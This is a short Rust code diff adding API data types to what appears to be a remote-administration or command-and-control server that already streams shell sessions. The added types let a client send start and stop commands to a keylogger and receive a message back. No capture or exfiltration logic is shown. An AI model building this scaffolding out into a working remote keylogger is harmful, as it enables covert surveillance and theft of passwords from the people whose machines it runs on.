@@ -126,3 +126,25 @@ pub struct ShellStreamResponse {
     pub stream_id: u32,
     pub message: String,
 }
+
+/// Action to perform on the keylogger
+#[derive(Debug, Clone, Copy, Serialize, Deserialize, ToSchema)]
+#[serde(rename_all = "lowercase")]
+pub enum KeyloggerAction {
+    Start,
+    Stop,
+}
+
+/// Payload for keylogger start/stop requests
+#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
+#[serde(rename_all = "camelCase")]
+pub struct KeyloggerRequestPayload {
+    pub action: KeyloggerAction,
+}
+
+/// Response for keylogger requests
+#[derive(Debug, Clone, Serialize, ToSchema)]
+#[serde(rename_all = "camelCase")]
+pub struct KeyloggerResponse {
+    pub message: String,
+}
